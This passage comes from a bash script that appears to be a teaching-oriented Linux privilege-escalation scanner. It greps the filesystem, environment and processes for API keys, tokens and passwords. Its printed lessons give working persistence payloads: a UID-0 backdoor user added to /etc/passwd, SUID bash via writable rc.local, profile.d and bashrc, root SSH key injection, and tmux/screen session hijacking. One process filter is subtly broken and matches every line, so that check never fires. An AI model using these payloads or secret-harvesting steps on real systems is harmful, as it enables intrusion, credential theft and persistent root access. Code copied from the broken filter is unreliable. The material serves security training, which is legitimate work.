        "Modern web frameworks store credentials in .env files, config files, or package managers. These are often readable and contain database passwords, API keys, secret keys." \
        "Developers use environment variables for configuration (12-factor app methodology). .env files, package.json, composer.json, Gemfiles all can contain secrets. Left readable by accident or misconfiguration." \
        "Common locations:\n  • .env (all frameworks)\n  • package.json (Node.js)\n  • composer.json (PHP)\n  • requirements.txt (Python)\n  • Gemfile (Ruby)\n  • appsettings.json (ASP.NET)"
    
    # .env files (used by Laravel, Node.js, Rails, etc)
    info "Searching for .env files..."
    find / -name ".env" -type f -readable 2>/dev/null | head -20 | while read envfile; do
        vuln "Found .env file: $envfile"
        if grep -iE "password|secret|key|token|api" "$envfile" 2>/dev/null | head -5 | grep -q "."; then
            critical ".env file with credentials: $envfile"
            warn "Contains credentials:"
            grep -iE "password|secret|key|token|api" "$envfile" 2>/dev/null | head -5 | while read line; do
                log "  $line"
            done
        fi
    done
    
    # Node.js package.json
    info "Checking Node.js package.json files..."
    find / -name "package.json" -type f -readable 2>/dev/null | head -10 | while read pkgfile; do
        if grep -qE "password|token|secret" "$pkgfile" 2>/dev/null; then
            warn "package.json with secrets: $pkgfile"
            grep -E "password|token|secret" "$pkgfile" 2>/dev/null | head -3
        fi
        
        # Check for node_modules with known vulnerabilities
        local dir=$(dirname "$pkgfile")
        if [ -d "$dir/node_modules" ]; then
            info "Node modules at: $dir/node_modules"
            teach "Run 'npm audit' here to check for vulnerable packages"
        fi
    done
    
    # Python virtual environments
    info "Checking Python virtual environments..."
    find / -name "pyvenv.cfg" -o -name "activate" -type f 2>/dev/null | head -10 | while read venv; do
        local venvdir=$(dirname "$venv")
        info "Python venv: $venvdir"
        
        # Check for credentials in activate script
        if [ -f "$venvdir/activate" ]; then
            if grep -qE "PASSWORD|SECRET|TOKEN" "$venvdir/activate" 2>/dev/null; then
                warn "Credentials in activate script: $venvdir/activate"
            fi
        fi
    done
    
    # PHP composer.json
    info "Checking PHP composer.json files..."
    find / -name "composer.json" -type f -readable 2>/dev/null | head -10 | while read composer; do
        if grep -qE "password|token|auth" "$composer" 2>/dev/null; then
            warn "composer.json with secrets: $composer"
            grep -E "password|token|auth" "$composer" 2>/dev/null | head -3
        fi
    done
    
    # Ruby Gemfile
    info "Checking Ruby Gemfile files..."
    find / -name "Gemfile" -type f -readable 2>/dev/null | head -10 | while read gemfile; do
        info "Found Gemfile: $gemfile"
        if grep -qE "password|token" "$gemfile" 2>/dev/null; then
            warn "Gemfile contains credentials"
        fi
    done
    
    # ASP.NET configuration
    find / -name "appsettings.json" -o -name "web.config" -type f -readable 2>/dev/null | head -10 | while read config; do
        warn "Found ASP.NET config: $config"
        if grep -iE "connectionstring|password|secret" "$config" 2>/dev/null | head -3 | grep -q "."; then
            vuln "Config contains credentials!"
            grep -iE "connectionstring|password|secret" "$config" 2>/dev/null | head -3
        fi
    done
}
# ============================================
# API Keys and Token Search
# ============================================
enum_api_keys() {
    section "API KEYS & TOKEN DISCOVERY"
    
    explain_concept "API Key Exposure" \
        "Modern applications use API keys and tokens for authentication. These are often hardcoded in files, environment variables, or configuration." \
        "Developers hardcode credentials for testing and forget to remove them. CI/CD systems store secrets in config files. API keys provide direct access to cloud resources, databases, payment systems, and third-party services. One leaked AWS key can compromise entire infrastructure." \
        "Common patterns:\n  • AWS: AKIA[0-9A-Z]{16}\n  • GitHub: ghp_, gho_, ghs_\n  • Slack: xox[baprs]-\n  • Google API: AIza[0-9A-Za-z\\-_]{35}\n  • Stripe: sk_live_, pk_live_"
    
    info "Searching for API keys and tokens in common locations (this can take several minutes)..."
    warn "Press ENTER to skip this check and continue to next enumeration."
    
    # Define regex patterns
    local aws_pattern='AKIA[0-9A-Z]{16}'
    local github_pattern='gh[ps]_[0-9a-zA-Z]{36}'
    local slack_pattern='xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,32}'
    local google_pattern='AIza[0-9A-Za-z\-_]{35}'
    local stripe_pattern='[sr]k_live_[0-9a-zA-Z]{24,}'
    local jwt_pattern='eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
    
    # Exclusion pattern for binary files, caches, and false positive locations
    local exclude_patterns="teachpeas|learnpeas|linpeas|\.git|node_modules|\.cache|IndexedDB|\.sqlite|\.db|\.bin|[Cc]ache|\.ico|\.woff|\.ttf|\.eot|\.svg|Extensions|/etc/chromium"
    
    # Search in common locations
    local search_paths=("/home" "/var/www" "/opt" "/etc" "/tmp")
    local total_paths=${#search_paths[@]}
    local current=0
    local skip_api_keys=false
    
    # Function to check if user pressed Enter
    check_skip() {
        if read -t 0.01; then
            skip_api_keys=true
            echo -ne "\r\033[K" >&2
            info "Skipping API key enumeration..."
            return 1
        fi
        return 0
    }
    
    for path in "${search_paths[@]}"; do
        [ ! -d "$path" ] && continue
        check_skip || break
        
        current=$((current + 1))
        
        echo -ne "\r[INFO] Searching $path... ($current/$total_paths) - Press ENTER to skip" >&2
        
        # AWS Keys - added -I to skip binary files
        check_skip || break
        local aws_results=$(grep -rInE "$aws_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -3)
        if [ -n "$aws_results" ]; then
            echo -ne "\r\033[K" >&2  # Clear progress line
            critical "AWS ACCESS KEY FOUND in $path - Full cloud access possible"
            vuln "AWS access key detected"
            echo "$aws_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # GitHub Tokens - added -I to skip binary files
        check_skip || break
        local github_results=$(grep -rInE "$github_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -3)
        if [ -n "$github_results" ]; then
            echo -ne "\r\033[K" >&2
            critical "GITHUB TOKEN FOUND in $path - Repository access possible"
            vuln "GitHub token detected"
            echo "$github_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # Slack Tokens - added -I to skip binary files
        check_skip || break
        local slack_results=$(grep -rInE "$slack_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2)
        if [ -n "$slack_results" ]; then
            echo -ne "\r\033[K" >&2
            warn "Slack token detected in: $path"
            echo "$slack_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # Google API Keys - added -I to skip binary files
        check_skip || break
        local google_results=$(grep -rInE "$google_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2)
        if [ -n "$google_results" ]; then
            echo -ne "\r\033[K" >&2
            warn "Google API key detected in: $path"
            echo "$google_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # Stripe Keys - added -I to skip binary files
        check_skip || break
        local stripe_results=$(grep -rInE "$stripe_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2)
        if [ -n "$stripe_results" ]; then
            echo -ne "\r\033[K" >&2
            critical "STRIPE API KEY FOUND in $path - Payment system access"
            vuln "Stripe key detected"
            echo "$stripe_results" | while IFS=: read -r file line_num rest; do
                log "  File: $file (line $line_num)"
            done
        fi
        
        # JWT Tokens - added -I to skip binary files
        check_skip || break
        if grep -rIE "$jwt_pattern" "$path" 2>/dev/null | grep -vE "$exclude_patterns" | head -2 | grep -q "."; then
            echo -ne "\r\033[K" >&2
            warn "JWT token detected in: $path"
            teach "JWT tokens can be decoded at jwt.io to extract user information"
        fi
    done
    
    echo -ne "\r\033[K" >&2  # Clear final progress line
    
    # Check environment variables (only if not skipped)
    if ! $skip_api_keys; then
        info "Checking environment variables for secrets..."
        if env | grep -iE "api_key|api_secret|access_key|secret_key|password|token" | grep -qv "teachpeas"; then
            warn "Potential secrets in environment variables:"
            env | grep -iE "api_key|api_secret|access_key|secret_key|password|token" | grep -v "teachpeas" | head -5 | while read line; do
                log "  $line"
            done
        fi
        
        teach "\nAPI Key Exploitation:"
        teach "  • AWS keys: Use aws-cli to enumerate and pivot"
        teach "  • GitHub tokens: Clone private repos, read secrets"
        teach "  • Slack tokens: Read messages, exfiltrate data"
        teach "  • Stripe keys: Access payment/customer data"
    fi
    
    # Clear any remaining input
    read -t 0.01 -n 10000 discard 2>/dev/null || true
}

# === ENHANCED DATABASE CHECKS ===
enum_databases_extended() {
    section "ENHANCED DATABASE ENUMERATION"
    
    explain_concept "Database Privilege Escalation - Extended" \
        "Databases with weak configs or accessible sockets can lead to command execution or file access." \
        "Beyond default credentials, check for: UDF exploits, file read/write permissions, command execution features, socket permissions." \
        "MSSQL: xp_cmdshell for command execution\nMySQL: UDF for code execution\nPostgreSQL: COPY TO PROGRAM\nMongoDB: NoSQL injection in apps"
    
    # Enhanced MySQL checks
    if command -v mysql >/dev/null 2>&1; then
        info "Enhanced MySQL enumeration..."
        
        # Check for mysql config files with credentials
        for conf in /etc/mysql/my.cnf ~/.my.cnf /etc/my.cnf; do
            if [ -r "$conf" ]; then
                info "Found MySQL config: $conf"
                if grep -qE "password|user" "$conf" 2>/dev/null; then
                    warn "Config contains credentials:"
                    grep -E "password|user" "$conf" 2>/dev/null | grep -v "^#"
                fi
            fi
        done
        
        # Check for .mysql_history
        find /root /home -name ".mysql_history" -readable 2>/dev/null | while read hist; do
            warn "MySQL history file: $hist"
            teach "May contain passwords in CREATE USER or GRANT statements"
            if grep -iE "password|identified by" "$hist" 2>/dev/null | head -3 | grep -q "."; then
                vuln "History contains passwords!"
            fi
        done
    fi
    
    # MSSQL checks
    if command -v sqlcmd >/dev/null 2>&1; then
        info "MSSQL client (sqlcmd) is available"
        teach "MSSQL exploitation if accessible:"
        teach "  1. Enable xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        teach "  2. Execute commands: EXEC xp_cmdshell 'whoami';"
        teach "  3. Common default creds: sa/sa, sa/password"
    fi
    
    # MongoDB enhanced
    if command -v mongo >/dev/null 2>&1 || command -v mongosh >/dev/null 2>&1; then
        local mongo_cmd=$(command -v mongosh 2>/dev/null || command -v mongo 2>/dev/null)
        
        # Check if accessible without auth
        if timeout 3 $mongo_cmd --eval "db.version()" 2>/dev/null | grep -q "MongoDB"; then
            critical "MongoDB unauthenticated - Dump all databases"
            vuln "MongoDB is accessible WITHOUT authentication!"
            
            teach "MongoDB exploitation:"
            teach "  1. List databases: show dbs"
            teach "  2. Select DB: use <database>"
            teach "  3. Dump collections: db.<collection>.find()"
            teach "  4. Look for users, credentials, API keys"
            
            # Try to enumerate databases
            local dbs=$(timeout 3 $mongo_cmd --quiet --eval "db.adminCommand('listDatabases')" 2>/dev/null)
            if [ -n "$dbs" ]; then
                info "MongoDB databases found:"
                echo "$dbs" | grep -oE '"name" : "[^"]*"' | cut -d'"' -f4 | while read db; do
                    log "  - $db"
                done
            fi
        fi
    fi
    
    # Check for database dump files (exclude phpmyadmin system files)
    info "Searching for database dump files..."
    find / -name "*.sql" -o -name "*.dump" -o -name "*.bak" 2>/dev/null | \
    grep -iE "backup|dump|sql" | \
    grep -vE "phpmyadmin|dbconfig-common|/usr/share/doc" | \
    head -10 | while read dump; do
        if [ -r "$dump" ]; then
            warn "Database dump file: $dump"
            teach "May contain credentials in CREATE USER, INSERT, or comments"
        fi
    done
}

# === CI/CD PIPELINE EXPOSURE ===
enum_cicd() {
    section "CI/CD PIPELINE & SECRET EXPOSURE"
    
    explain_concept "CI/CD Secrets" \
        "CI/CD systems store credentials for deployments. Config files, environment variables, and cached credentials can be exposed." \
        "Jenkins, GitLab CI, GitHub Actions all need credentials to deploy. These are stored in config files, environment variables, or .git/config. Often readable by web server or application user." \
        "Check:\n  • .git/config (remote URLs with tokens)\n  • .gitlab-ci.yml (secret variables)\n  • Jenkinsfile (credentials)\n  • .github/workflows/*.yml"
    
    # Git configuration with tokens
    info "Checking .git/config for embedded tokens..."
    find / -name ".git" -type d 2>/dev/null | head -20 | while read gitdir; do
        if [ -r "$gitdir/config" ]; then
            if grep -E "https://.*:.*@|token" "$gitdir/config" 2>/dev/null | grep -q "."; then
                critical "Git credentials in config: $gitdir/config"
                vuln "Git config with credentials: $gitdir/config"
                grep -E "https://.*:.*@|token" "$gitdir/config" 2>/dev/null | while read line; do
                    log "  $line"
                done
                teach "Extract token and use for repository access or API calls"
            fi
        fi
        
        # Check git logs for secrets
        if [ -d "$gitdir" ]; then
            local gitroot=$(dirname "$gitdir")
            cd "$gitroot" 2>/dev/null && {
                if git log -p 2>/dev/null | grep -iE "password|secret|key" | head -5 | grep -q "."; then
                    warn "Git history contains potential secrets in: $gitroot"
                    teach "Review with: git log -p | grep -i password"
                fi
            }
        fi
    done
    
    # GitLab CI configuration
    find / -name ".gitlab-ci.yml" -type f -readable 2>/dev/null | head -10 | while read gitlab; do
        warn "GitLab CI config: $gitlab"
        if grep -iE "password|secret|token|key" "$gitlab" 2>/dev/null | grep -v "\\$" | head -3 | grep -q "."; then
            critical "Hardcoded secrets in GitLab CI: $gitlab"
            vuln "Hardcoded secrets in GitLab CI!"
            grep -iE "password|secret|token|key" "$gitlab" 2>/dev/null | grep -v "\\$" | head -3
        fi
        teach "Even if using variables, check GitLab runner cache for exposed secrets"
    done
    
    # GitHub Actions
    find / -name ".github" -type d 2>/dev/null | head -10 | while read ghdir; do
        if [ -d "$ghdir/workflows" ]; then
            info "GitHub Actions workflows: $ghdir/workflows"
            find "$ghdir/workflows" -name "*.yml" -o -name "*.yaml" | while read workflow; do
                if grep -iE "password|secret|token" "$workflow" 2>/dev/null | grep -v "secrets\\." | grep -q "."; then
                    warn "Potential hardcoded secret in: $workflow"
                fi
            done
        fi
    done
    
    # Jenkins
    if [ -d /var/lib/jenkins ] || [ -d /var/jenkins_home ]; then
        warn "Jenkins directory detected"
        teach "Jenkins exploitation:"
        teach "  • credentials.xml contains encrypted credentials"
        teach "  • secrets/ directory has master key"
        teach "  • jobs/*/config.xml may have plaintext tokens"
        teach "  • If you can access Jenkins web, use Script Console for RCE"
        
        # Check for readable Jenkins credentials
        find /var/lib/jenkins /var/jenkins_home -name "credentials.xml" -readable 2>/dev/null | while read creds; do
            critical "Readable Jenkins credentials: $creds"
            vuln "Readable Jenkins credentials: $creds"
        done
    fi
    
    # Docker registry credentials
    for dockerconf in ~/.docker/config.json /root/.docker/config.json; do
        if [ -r "$dockerconf" ]; then
            vuln "Docker config with registry credentials: $dockerconf"
            teach "Contains auth tokens for Docker registries"
            teach "Decode with: cat $dockerconf | jq -r '.auths[].auth' | base64 -d"
        fi
    done
}

# ═══════════════════════════════════════════════════
# END PHASE 1 ADDITIONS
# ═══════════════════════════════════════════════════

# === PROCESS MONITORING ===
enum_processes() {
    section "RUNNING PROCESSES ANALYSIS"
    
    # PHASE 1: SILENT SCAN - Collect findings
    local temp_cred_procs="/tmp/.learnpeas_cred_procs_$$"
    local temp_sessions="/tmp/.learnpeas_sessions_$$"
    
    cleanup_process_temps() {
        rm -f "$temp_cred_procs" "$temp_sessions" 2>/dev/null
    }
    trap cleanup_process_temps RETURN
    
    # Check for credentials in process command lines
    ps aux | grep -iE "password=|passwd=|-p[[:space:]]+[^[:space:]]+|--password[[:space:]]+|token=|key=|secret=|api.*=" | grep -v "grep" | while read line; do
        # Filter out common false positives
        echo "$line" | grep -qE "ps aux|teachpeas|learnpeas|linpeas|brave|chrome|firefox|electron|" && continue
        echo "$line" >> "$temp_cred_procs"
    done
    
    # Check for tmux sessions
    if command -v tmux >/dev/null 2>&1; then
        local tmux_sessions=$(tmux ls 2>/dev/null | wc -l)
        if [ "$tmux_sessions" -gt 0 ]; then
            echo "tmux|$tmux_sessions" >> "$temp_sessions"
        fi
    fi
    
    # Check for screen sessions
    if command -v screen >/dev/null 2>&1; then
        if screen -ls 2>/dev/null | grep -q "Detached\|Attached"; then
            local screen_count=$(screen -ls 2>/dev/null | grep -c "Detached\|Attached")
            echo "screen|$screen_count" >> "$temp_sessions"
        fi
    fi
    
    # PHASE 2: CONDITIONAL EDUCATION (only if findings)
    if [ -s "$temp_cred_procs" ] || [ -s "$temp_sessions" ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  PROCESS ANALYSIS - Credential Exposure & Session Hijacking"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHY PROCESS MONITORING MATTERS:"
        teach "  Running processes reveal:"
        teach "  • Credentials passed as command-line arguments (visible in ps)"
        teach "  • Active sessions (tmux/screen) you can attach to"
        teach "  • Services running as root that might be exploitable"
        teach "  • Long-running processes that might have secrets in memory"
        teach ""
        teach "COMMAND-LINE CREDENTIALS:"
        teach "  When users run: mysql -u root -p SecretPass123"
        teach "  The password appears in 'ps aux' output for everyone to see."
        teach "  This persists in process list until the command completes."
        teach ""
        teach "SESSION HIJACKING:"
        teach "  tmux and screen create persistent terminal sessions."
        teach "  If you can attach to another user's session:"
        teach "  • You see everything they're typing"
        teach "  • You can execute commands as them"
        teach "  • You inherit their permissions and active shells"
        log ""
    fi
    
    # PHASE 3: REPORT SPECIFIC FINDINGS
    
    # Report credential exposures
    if [ -s "$temp_cred_procs" ]; then
        critical "CREDENTIALS IN PROCESS COMMAND LINES"
        vuln "Processes with potentially exposed credentials detected"
        log ""
        
        cat "$temp_cred_procs" | while read line; do
            warn "Process: $line"
        done
        
        log ""
        teach "EXPLOITATION:"
        teach "  These credentials are visible to all users via 'ps aux'."
        teach "  Copy the credentials and try using them for:"
        teach "  • Database access"
        teach "  • SSH connections"
        teach "  • API authentication"
        teach "  • Service accounts"
        teach ""
        teach "WHY THIS HAPPENS:"
        teach "  Developers and admins pass credentials on command line for:"
        teach "  • Quick testing ('just this once')"
        teach "  • Automated scripts without proper secret management"
        teach "  • Convenience (typing password inline instead of prompt)"
        teach ""
        teach "BETTER ALTERNATIVES (as admin):"
        teach "  • Use config files with restricted permissions"
        teach "  • Use environment variables"
        teach "  • Use password prompts instead of arguments"
        teach "  • Use credential management systems (vault, secrets manager)"
        log ""
    fi
    
    # Report tmux sessions
    if [ -s "$temp_sessions" ]; then
        while IFS='|' read -r session_type count; do
            if [ "$session_type" = "tmux" ]; then
                critical "ACTIVE TMUX SESSIONS - Attach to steal shells"
                vuln "Found $count active tmux session(s)"
                log ""
                
                # List the actual sessions
                info "Available tmux sessions:"
                tmux ls 2>/dev/null | while read session; do
                    log "  $session"
                done
                
                log ""
                teach "╔═══════════════════════════════════════════════════════════╗"
                teach "║  TMUX SESSION HIJACKING"
                teach "╚═══════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IS TMUX:"
                teach "  Terminal multiplexer - creates persistent terminal sessions"
                teach "  that survive disconnection. Users can detach/reattach sessions."
                teach ""
                teach "WHY YOU CAN HIJACK THEM:"
                teach "  tmux sessions are stored in /tmp/tmux-UID/"
                teach "  If permissions allow, you can attach to other users' sessions."
                teach ""
                teach "EXPLOITATION:"
                teach "  1. List sessions: tmux ls"
                teach "  2. Attach to session: tmux attach -t <session-name>"
                teach "  3. If multiple sessions exist, try each one"
                teach ""
                teach "WHAT YOU GET:"
                teach "  • Live view of everything the user is typing"
                teach "  • Ability to execute commands as that user"
                teach "  • Access to their active shell with their permissions"
                teach "  • Any credentials they type become visible to you"
                teach ""
                teach "IF ATTACHMENT FAILS:"
                teach "  • Check socket permissions: ls -la /tmp/tmux-*/"
                teach "  • Try with sudo if you have it: sudo tmux attach -t <session>"
                teach "  • Some sessions require specific user ownership"
                teach ""
                teach "STEALTH CONSIDERATIONS:"
                teach "  • The user will see you attach (terminal shows 'attached')"
                teach "  • Everything you type appears in their terminal too"
                teach "  • Better to observe than interact (they'll notice commands)"
                teach "  • Detach quickly after gathering info: Ctrl+b, then d"
                log ""
                
            elif [ "$session_type" = "screen" ]; then
                critical "DETACHED SCREEN SESSIONS - Attach to hijack shells"
                vuln "Found $count screen session(s)"
                log ""
                
                # List the actual sessions
                info "Available screen sessions:"
                screen -ls 2>/dev/null | grep -E "Detached|Attached" | while read session; do
                    log "  $session"
                done
                
                log ""
                teach "╔═══════════════════════════════════════════════════════════╗"
                teach "║  SCREEN SESSION HIJACKING"
                teach "╚═══════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IS SCREEN:"
                teach "  Like tmux, screen creates persistent terminal sessions."
                teach "  Older tool but still widely used."
                teach ""
                teach "EXPLOITATION:"
                teach "  1. List sessions: screen -ls"
                teach "  2. Attach to detached session: screen -r"
                teach "  3. If multiple sessions: screen -r <pid.tty.host>"
                teach ""
                teach "MULTI-USER ATTACH:"
                teach "  screen -x  # Attach even if session is already attached"
                teach "  This allows you to watch what another user is doing live."
                teach ""
                teach "WHAT YOU GET:"
                teach "  Same as tmux - live access to user's terminal session."
                log ""
            fi
        done < "$temp_sessions"
    fi
    
    # PHASE 4: CLEAN SUMMARY
    log ""
    if [ ! -s "$temp_cred_procs" ] && [ ! -s "$temp_sessions" ]; then
        ok "No exposed credentials or hijackable sessions detected"
    fi
}

# === BOOT SCRIPT ANALYSIS ===
enum_boot_scripts() {
    section "BOOT & LOGIN SCRIPT ANALYSIS"
    
    # === PHASE 1: SILENT SCAN - Collect all findings ===
    local temp_writable_boot="/tmp/.learnpeas_boot_scripts_$$"
    local temp_writable_profile="/tmp/.learnpeas_profile_scripts_$$"
    local temp_writable_motd="/tmp/.learnpeas_motd_scripts_$$"
    local temp_writable_bashrc="/tmp/.learnpeas_bashrc_$$"
    local found_issues=0
    
    cleanup_boot_temps() {
        rm -f "$temp_writable_boot" "$temp_writable_profile" "$temp_writable_motd" "$temp_writable_bashrc" 2>/dev/null
    }
    trap cleanup_boot_temps RETURN
    
    # Check /etc/rc.local (classic boot script)
    if [ -f /etc/rc.local ]; then
        if [ -w /etc/rc.local ]; then
            echo "/etc/rc.local" >> "$temp_writable_boot"
            found_issues=1
        fi
    fi
    
    # Check /etc/profile.d/*.sh (runs for all logins)
    if [ -d /etc/profile.d ]; then
        if [ -w /etc/profile.d ]; then
            echo "/etc/profile.d|directory" >> "$temp_writable_profile"
            found_issues=1
        fi
        
        find /etc/profile.d -name "*.sh" -type f 2>/dev/null | while read script; do
            if [ -w "$script" ]; then
                echo "$script|file" >> "$temp_writable_profile"
                found_issues=1
            fi
        done
    fi
    
    # Check /etc/bash.bashrc (global bash config)
    if [ -f /etc/bash.bashrc ]; then
        if [ -w /etc/bash.bashrc ]; then
            echo "/etc/bash.bashrc" >> "$temp_writable_bashrc"
            found_issues=1
        fi
    fi
    
    # Check /etc/bashrc (CentOS/RHEL alternative)
    if [ -f /etc/bashrc ]; then
        if [ -w /etc/bashrc ]; then
            echo "/etc/bashrc" >> "$temp_writable_bashrc"
            found_issues=1
        fi
    fi
    
    # Check /etc/profile (global profile)
    if [ -f /etc/profile ]; then
        if [ -w /etc/profile ]; then
            echo "/etc/profile" >> "$temp_writable_bashrc"
            found_issues=1
        fi
    fi
    
    # Check /etc/update-motd.d/* (message of the day scripts)
    if [ -d /etc/update-motd.d ]; then
        if [ -w /etc/update-motd.d ]; then
            echo "/etc/update-motd.d|directory" >> "$temp_writable_motd"
            found_issues=1
        fi
        
        find /etc/update-motd.d -type f 2>/dev/null | while read script; do
            if [ -w "$script" ]; then
                echo "$script|file" >> "$temp_writable_motd"
                found_issues=1
            fi
        done
    fi
    
    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
    if [ $found_issues -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  BOOT & LOGIN SCRIPTS - Understanding Execution Context"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT ARE BOOT/LOGIN SCRIPTS:"
        teach "  Scripts that execute automatically during system boot or"
        teach "  when users log in. They run with the privileges of the"
        teach "  user logging in or as root during boot."
        teach ""
        teach "EXECUTION TIMELINE:"
        teach "  1. BOOT PHASE:"
        teach "     • System starts"
        teach "     • /etc/rc.local executes (as root, legacy but still works)"
        teach "     • Commands run before any user logs in"
        teach ""
        teach "  2. LOGIN PHASE:"
        teach "     • User SSH/console login"
        teach "     • /etc/profile.d/*.sh execute (as logging-in user)"
        teach "     • /etc/bash.bashrc executes (as logging-in user)"
        teach "     • Commands run every time user logs in"
        teach ""
        teach "  3. MOTD PHASE:"
        teach "     • User connects (SSH/login)"
        teach "     • /etc/update-motd.d/* scripts execute (as root!)"
        teach "     • Generate 'Message of the Day' banner"
        teach ""
        teach "WHY MISCONFIGURATIONS HAPPEN:"
        teach ""
        teach "  Scenario 1 - The Quick Fix Admin:"
        teach "    Admin needs: 'Run this command on every boot'"
        teach "    Solution: 'I'll add it to rc.local'"
        teach "    Mistake: chmod 666 /etc/rc.local (too permissive)"
        teach "    Reality: Any user can now add root commands"
        teach ""
        teach "  Scenario 2 - The Helpful MOTD:"
        teach "    Admin wants: 'Show system stats on login'"
        teach "    Solution: 'Add script to /etc/update-motd.d/'"
        teach "    Mistake: Forgets scripts run as ROOT"
        teach "    Reality: Your code executes with root privileges"
        teach ""
        teach "  Scenario 3 - The Team Environment:"
        teach "    Developers need: 'Set PATH for whole team'"
        teach "    Solution: 'Make /etc/profile.d/ writable'"
        teach "    Mistake: Trusts all team members"
        teach "    Reality: One compromised account = game over"
        teach ""
        teach "CRITICAL DISTINCTION:"
        teach ""
        teach "  /etc/rc.local:"
        teach "    • Runs: At boot"
        teach "    • User: root"
        teach "    • Trigger: System reboot"
        teach "    • Wait: Until next reboot (could be weeks/months)"
        teach ""
        teach "  /etc/profile.d/*.sh:"
        teach "    • Runs: At every user login"
        teach "    • User: The user logging in"
        teach "    • Trigger: ANY user SSH/login"
        teach "    • Wait: Seconds (next admin login)"
        teach ""
        teach "  /etc/update-motd.d/*:"
        teach "    • Runs: At every login"
        teach "    • User: ROOT (even for non-root logins!)"
        teach "    • Trigger: ANY SSH connection"
        teach "    • Wait: Instant (next SSH attempt)"
        teach ""
        teach "THE TIMING GAME:"
        teach "  • rc.local = Patient attack (wait for reboot)"
        teach "  • profile.d = Medium wait (next admin login)"
        teach "  • update-motd.d = Instant (next SSH connection)"
        log ""
    fi
    
    # === PHASE 3: REPORT SPECIFIC FINDINGS ===
    
    # Report writable rc.local
    if [ -s "$temp_writable_boot" ]; then
        critical "WRITABLE /etc/rc.local - Root command execution on next reboot"
        log ""
        
        while IFS= read -r script; do
            vuln "Writable boot script: $script"
        done < "$temp_writable_boot"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  /etc/rc.local EXPLOITATION"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IS rc.local:"
        teach "  Legacy boot script that runs commands after all services"
        teach "  have started. Executes as root, before any user logs in."
        teach ""
        teach "EXPLOITATION:"
        teach ""
        teach "  Method 1 - SUID Binary (Persistent):"
        teach "    echo 'chmod u+s /bin/bash' >> /etc/rc.local"
        teach "    # After reboot: /bin/bash -p"
        teach ""
        teach "  Method 2 - Backdoor User:"
        teach "    echo 'echo \"backdoor:x:0:0::/root:/bin/bash\" >> /etc/passwd' >> /etc/rc.local"
        teach "    # After reboot: su backdoor"
        teach ""
        teach "  Method 3 - SSH Key Injection:"
        teach "    cat >> /etc/rc.local << 'EOF'"
        teach "mkdir -p /root/.ssh"
        teach "echo 'YOUR_PUBLIC_KEY' >> /root/.ssh/authorized_keys"
        teach "chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys"
        teach "EOF"
        teach "    # After reboot: ssh -i your_key root@target"
        teach ""
        teach "TRIGGERING:"
        teach "  Wait for system reboot (passive)"
        teach "  Monitor uptime to detect reboots: uptime"
        log ""
    fi
    
    # Report writable profile.d
    if [ -s "$temp_writable_profile" ]; then
        critical "WRITABLE /etc/profile.d - Code execution on next user login"
        log ""
        
        while IFS='|' read -r item type; do
            if [ "$type" = "directory" ]; then
                critical "Writable directory: $item"
            else
                vuln "Writable script: $item"
            fi
        done < "$temp_writable_profile"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  /etc/profile.d EXPLOITATION"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "EXECUTION CONTEXT:"
        teach "  Scripts run AS THE USER logging in"
        teach "  Root login → runs as root"
        teach "  Regular user → runs as that user"
        teach ""
        teach "EXPLOITATION:"
        teach ""
        teach "  Method 1 - Create New Script (if directory writable):"
        teach "    cat > /etc/profile.d/00-system.sh << 'EOF'"
        teach "#!/bin/bash"
        teach "if [ \$(id -u) -eq 0 ]; then"
        teach "    chmod u+s /bin/bash"
        teach "fi"
        teach "EOF"
        teach "    chmod +x /etc/profile.d/00-system.sh"
        teach "    # Wait for root/admin to login"
        teach ""
        teach "  Method 2 - Modify Existing Script:"
        teach "    cat >> /etc/profile.d/existing.sh << 'EOF'"
        teach "if [ \$(id -u) -eq 0 ]; then"
        teach "    cp /bin/bash /tmp/.update && chmod 4755 /tmp/.update"
        teach "fi"
        teach "EOF"
        teach ""
        teach "TRIGGERING:"
        teach "  Wait for ANY user login"
        teach "  Root/admin login executes your payload as root"
        log ""
    fi
    
    # Report writable bashrc
    if [ -s "$temp_writable_bashrc" ]; then
        warn "WRITABLE GLOBAL BASH CONFIG - Code execution on every bash session"
        log ""
        
        while IFS= read -r script; do
            vuln "Writable bash config: $script"
        done < "$temp_writable_bashrc"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  GLOBAL BASHRC EXPLOITATION"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IS bash.bashrc:"
        teach "  Executes for EVERY bash shell (interactive + non-interactive)"
        teach "  More triggers than profile.d (which only runs on login)"
        teach ""
        teach "EXPLOITATION:"
        teach ""
        teach "  cat >> /etc/bash.bashrc << 'EOF'"
        teach ""
        teach "if [ \$(id -u) -eq 0 ] && [ ! -f /tmp/.configured ]; then"
        teach "    chmod u+s /bin/bash"
        teach "    touch /tmp/.configured"
